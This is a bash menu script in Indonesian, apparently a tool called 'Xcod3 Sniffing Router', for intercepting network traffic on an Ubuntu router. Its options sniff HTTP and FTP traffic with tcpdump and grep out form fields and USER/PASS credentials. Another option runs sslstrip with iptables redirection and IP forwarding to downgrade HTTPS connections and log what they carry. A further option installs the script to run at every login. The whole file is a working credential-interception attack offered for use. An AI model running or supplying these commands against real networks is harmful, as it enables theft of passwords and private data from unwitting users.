#!/bin/bash
# Developers : ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
#Program ini dapat digunakan untuk personal ataupun komersial.

again='y'
while [[ $again == 'Y' ]] || [[ $again == 'y' ]];
do
clear
echo "=================================================================";
echo " Xcod3 Sniffing Router for Ubuntu 16.04                         ";
echo " Developers : ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id                              ";
echo " Version 2.0 - 09/08/2022                                       ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Pengaktifan                                                     ";
echo " [1]  Aktifkan penyadapan HTTP                                   ";
echo " [2]  Aktifkan penyadapan FTP                                    ";
echo " [3]  Install python-twisted-web                                 ";
echo " [4]  Aktifkan penyadapan dengan SSL STRIPPING                   ";
echo "-----------------------------------------------------------------";
echo " Lihat hasil penyadapan                                          ";
echo " [5]  Lihat hasil penyadapan HTTP                                ";
echo " [6]  Lihat hasil penyadapan FTP                                 ";
echo " [7]  Lihat hasil penyadapan dengan SSL STRIPPING                ";
echo "-----------------------------------------------------------------";
echo " Lainnya                                                         ";
echo " [8]  Pindah ke Xcod3 Sniffing Router                            ";
echo " [9]  Reboot                                                     ";
echo " [10] Exit                                                       ";
echo "=================================================================";
read -p " Masukkan Nomor Pilihan Anda antara [1 - 10] : " choice;
echo "";
case $choice in
1)  sudo tcpdump -A port http -i eth0 > httpdump
    sudo echo -n "nama variabel input yang dicari : "
    read namavar
    sudo cat httpdump | grep "$namavar"
    ;;
2)  sudo tcpdump -A port ftp -i eth0 > ftpdump
    sudo cat ftpdump | grep USER
    sudo cat ftpdump | grep PASS
    ;;
3)  sudo apt-get install python-twisted-web
    ;;
4)  sudo iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port 5000
    sudo python /Xcod3-SniffingRouter/support/sslstrip/sslstrip.py -l 5000
    sudo iptables -F
    sudo iptables -X
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo iptables -t mangle -F
    sudo iptables -t mangle -X
    sudo sysctl -w net.ipv4.ip_forward=1
    sudo /sbin/iptables -P FORWARD ACCEPT
    sudo /sbin/iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE
    sudo cat sslstrip.log
    ;;
5)  sudo echo -n "nama variabel input yang dicari : "
    read namavar
    sudo cat httpdump | grep "$namavar"
    ;;
6)  sudo cat ftpdump | grep USER
    sudo cat ftpdump | grep PASS
    ;;   

7)  sudo cat sslstrip.log
    ;;
8)  sudo rm /etc/profile.d/myscript.sh
    sudo ln -s /Xcod3-SniffingRouter/xcod3router.sh /etc/profile.d/myscript.sh
    read -p "Tekan enter untuk restart"
    sudo systemctl reboot -i
    ;;

9) read -p "Apakah anda yakin akan restart? y/n :" -n 1 -r
    echo 
    if [[ ! $REPLY =~ ^[Nn]$ ]]
    then
    sudo systemctl reboot -i
    fi
    ;;

10) ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "Xcod3 Sniffing Router"
echo "Developers : ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [[ $again != 'Y' ]] && [[ $again != 'y' ]] && [[ $again != 'N' ]] && [[ $again != 'n' ]];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done
